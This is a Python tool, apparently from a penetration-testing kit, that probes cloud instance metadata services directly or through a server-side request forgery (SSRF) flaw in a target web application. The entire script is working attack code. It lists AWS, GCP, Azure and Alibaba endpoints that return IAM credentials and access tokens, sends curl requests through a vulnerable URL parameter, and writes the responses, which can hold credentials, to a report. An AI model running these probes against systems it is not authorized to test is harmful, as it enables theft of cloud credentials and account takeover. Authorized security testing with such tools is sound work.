#!/usr/bin/env python3
"""ctest metadata probe — test cloud metadata endpoints via SSRF or direct access."""
import json
import subprocess
import sys
import os
from datetime import datetime


METADATA_ENDPOINTS = {
    "aws_imdsv1": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "headers": "",
        "provider": "aws",
        "note": "IMDSv1 — no token required",
    },
    "aws_imdsv2_token": {
        "url": "http://169.254.169.254/latest/api/token",
        "headers": '-H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT',
        "provider": "aws",
        "note": "IMDSv2 — token acquisition (PUT required)",
    },
    "aws_userdata": {
        "url": "http://169.254.169.254/latest/user-data",
        "headers": "",
        "provider": "aws",
        "note": "EC2 user-data (often contains secrets)",
    },
    "aws_iam_role": {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "headers": "",
        "provider": "aws",
        "note": "IAM role name — follow up with role creds",
    },
    "gcp_default": {
        "url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "headers": '-H "Metadata-Flavor: Google"',
        "provider": "gcp",
        "note": "GCP metadata (requires header)",
    },
    "gcp_token": {
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "headers": '-H "Metadata-Flavor: Google"',
        "provider": "gcp",
        "note": "GCP SA access token",
    },
    "gcp_project": {
        "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "headers": '-H "Metadata-Flavor: Google"',
        "provider": "gcp",
        "note": "GCP project ID",
    },
    "azure_imds": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": '-H "Metadata: true"',
        "provider": "azure",
        "note": "Azure IMDS (requires header)",
    },
    "azure_token": {
        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "headers": '-H "Metadata: true"',
        "provider": "azure",
        "note": "Azure managed identity token",
    },
    "alibaba_meta": {
        "url": "http://100.100.100.200/latest/meta-data/",
        "headers": "",
        "provider": "alibaba",
        "note": "Alibaba Cloud metadata (no headers needed)",
    },
    "alibaba_ram": {
        "url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "headers": "",
        "provider": "alibaba",
        "note": "Alibaba RAM role credentials",
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1.json",
        "headers": "",
        "provider": "digitalocean",
        "note": "DigitalOcean droplet metadata",
    },
}


def run_cmd(cmd, timeout=10):
    """Run shell command, return (stdout, exit_code)."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", 124
    except Exception:
        return "", 1


def probe_direct(endpoints=None, providers=None):
    """Probe metadata endpoints directly (from inside cloud instance)."""
    targets = _filter_endpoints(endpoints, providers)
    return _run_probes(targets, ssrf_url=None)


def probe_ssrf(ssrf_url, param="url", method="GET", endpoints=None, providers=None):
    """
    Probe metadata via SSRF vector.

    Args:
        ssrf_url: the vulnerable endpoint (e.g., "https://app.target.com/api/fetch")
        param: query parameter or body field that accepts URL
        method: GET or POST
        endpoints: specific endpoint keys to test (default: all)
        providers: filter by provider ["aws", "gcp", "azure"]
    """
    targets = _filter_endpoints(endpoints, providers)
    return _run_probes(targets, ssrf_url=ssrf_url, param=param, method=method)


def _filter_endpoints(endpoints=None, providers=None):
    """Filter endpoint list by keys or provider."""
    targets = METADATA_ENDPOINTS
    if endpoints:
        targets = {k: v for k, v in targets.items() if k in endpoints}
    if providers:
        targets = {k: v for k, v in targets.items() if v["provider"] in providers}
    return targets


def _run_probes(targets, ssrf_url=None, param="url", method="GET"):
    """Execute probes and collect results."""
    results = {"accessible": [], "blocked": [], "timeout": [], "summary": {}}

    print(f"[metadata_probe] Testing {len(targets)} endpoints")
    if ssrf_url:
        print(f"  Via SSRF: {ssrf_url} (param={param})")
    print()

    for key, endpoint in targets.items():
        meta_url = endpoint["url"]

        if ssrf_url:
            if method == "GET":
                cmd = f'curl -sk -o /tmp/meta_out.txt -w "%{{http_code}}" "{ssrf_url}?{param}={meta_url}"'
            else:
                cmd = f'curl -sk -X POST -d \'{json.dumps({param: meta_url})}\' -H "Content-Type: application/json" -o /tmp/meta_out.txt -w "%{{http_code}}" "{ssrf_url}"'
        else:
            cmd = f'curl -sk {endpoint["headers"]} -o /tmp/meta_out.txt -w "%{{http_code}}" "{meta_url}"'

        status_code, exit_code = run_cmd(cmd)
        body, _ = run_cmd("cat /tmp/meta_out.txt 2>/dev/null")

        entry = {
            "key": key,
            "url": meta_url,
            "provider": endpoint["provider"],
            "note": endpoint["note"],
            "status": status_code,
            "body_preview": body[:200] if body else "",
        }

        if exit_code == 124:
            results["timeout"].append(entry)
            print(f"  ⏱ {key}: timeout")
        elif status_code in ("200", "201"):
            results["accessible"].append(entry)
            icon = "🔴" if "token" in key or "credential" in key or "iam" in key else "🟠"
            print(f"  {icon} {key}: {status_code} — {endpoint['note']}")
            if body:
                print(f"     Preview: {body[:80]}")
        else:
            results["blocked"].append(entry)
            print(f"  ✗ {key}: {status_code}")

    results["summary"] = {
        "total": len(targets),
        "accessible": len(results["accessible"]),
        "blocked": len(results["blocked"]),
        "timeout": len(results["timeout"]),
    }

    print(f"\n[metadata_probe] Results: {results['summary']['accessible']} accessible, "
          f"{results['summary']['blocked']} blocked, {results['summary']['timeout']} timeout")
    return results


def write_report(results, output_dir="./ctest-output"):
    """Write results to markdown report."""
    os.makedirs(output_dir, exist_ok=True)
    path = os.path.join(output_dir, "metadata-probe.md")
    with open(path, "w") as f:
        f.write(f"# Cloud Metadata Probe Results\n\n")
        f.write(f"**Date:** {datetime.now().isoformat()}\n\n")
        s = results["summary"]
        f.write(f"**Total:** {s['total']} | **Accessible:** {s['accessible']} | "
                f"**Blocked:** {s['blocked']} | **Timeout:** {s['timeout']}\n\n")
        if results["accessible"]:
            f.write("## Accessible Endpoints\n\n")
            for r in results["accessible"]:
                f.write(f"### {r['key']} ({r['provider']})\n")
                f.write(f"- URL: `{r['url']}`\n- Status: {r['status']}\n")
                f.write(f"- Note: {r['note']}\n")
                if r["body_preview"]:
                    f.write(f"- Preview:\n```\n{r['body_preview']}\n```\n\n")
    print(f"  Report: {path}")
    return path


if __name__ == "__main__":
    results = probe_direct()
    write_report(results)
